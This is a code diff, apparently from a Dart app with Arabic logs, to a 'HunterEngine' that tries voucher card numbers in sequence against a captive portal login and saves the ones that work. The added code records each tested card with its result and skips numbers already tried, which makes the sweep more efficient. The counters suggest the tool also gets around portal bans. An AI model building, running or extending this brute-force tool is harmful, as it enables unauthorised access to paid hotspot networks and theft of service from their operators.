@@ -144,6 +144,26 @@ class HunterDatabaseAdapter implements HunterDatabase {
   }) async {
     return await _db.saveFoundCard(cardNumber, loginUrl, notes: notes) as bool;
   }
+
+  @override
+  Future<void> recordTestedCard({
+    required String cardNumber,
+    required String status,
+    required String portalMessage,
+    bool isLast = true,
+  }) async {
+    await _db.recordTestedCard(
+      cardNumber: cardNumber,
+      status: status,
+      portalMessage: portalMessage,
+      isLast: isLast,
+    );
+  }
+
+  @override
+  Future<bool> isCardAlreadyTested(String cardNumber) async {
+    return await _db.isCardAlreadyTested(cardNumber) as bool;
+  }
 }
 
 /// Sequential captive-portal workflow with fail-closed result handling.
@@ -346,6 +366,23 @@ class HunterEngine {
 
         if (_stopRequested) break;
 
+        // التخطي الذكي للكروت التي تم اختبارها مسبقاً (سواء نجحت أو فشلت)
+        if (currentConfig.skipAlreadyTested) {
+          int skippedCount = 0;
+          final startSkipNumber = currentNumber;
+          while (await db.isCardAlreadyTested(currentNumber) && !_stopRequested) {
+            skippedCount++;
+            currentNumber = NumberFormatter.nextNumber(currentNumber);
+          }
+          if (skippedCount > 0) {
+            onLog?.call(
+              '⏩ [تخطي ذكي]: تم تخطي $skippedCount كرت تم اختبارها مسبقاً (بدءاً من $startSkipNumber) والقفز مباشرة إلى: $currentNumber',
+            );
+            await db.setState('last_tested_number', currentNumber);
+          }
+          if (_stopRequested) break;
+        }
+
         if (currentConfig.maxAttempts > 0 && attempt >= currentConfig.maxAttempts) {
           onLog?.call(
             '🏁 تم الوصول إلى الحد الأقصى للمحاولات المحدد (${currentConfig.maxAttempts}).',
@@ -495,6 +532,12 @@ class HunterEngine {
             '🎉 تم اصطياد كرت صحيح بنجاح! الرقم: $currentNumber (الرابط: $finalUrl)',
           );
           await db.saveFoundCard(currentNumber, finalUrl);
+          await db.recordTestedCard(
+            cardNumber: currentNumber,
+            status: 'success',
+            portalMessage: 'تم تسجيل الدخول بنجاح واصطياد الكرت 🎉',
+            isLast: true,
+          );
           onFound?.call(currentNumber, finalUrl);
           onStats?.call(currentNumber, totalAttempts, foundCount, unbanCount);
 
@@ -538,7 +581,16 @@ class HunterEngine {
         // ---------------------------------------------------------------------
         if (verifyResult.isDefinitiveFailure) {
           consecutiveErrors = 0;
+          final portalMsg = browserController?.lastAlertMessage ??
+              verifyResult.error ??
+              'رمز الدخول غير صحيح أو انتهت صلاحية الكرت';
           onLog?.call('  ❌ عاد لصفحة الدخول أو رفضت البوابة البيانات — الرقم غير صحيح: $currentNumber');
+          await db.recordTestedCard(
+            cardNumber: currentNumber,
+            status: 'failed',
+            portalMessage: portalMsg,
+            isLast: true,
+          );
           final nextNum = NumberFormatter.nextNumber(currentNumber);
           await db.setState('last_tested_number', nextNum);
 
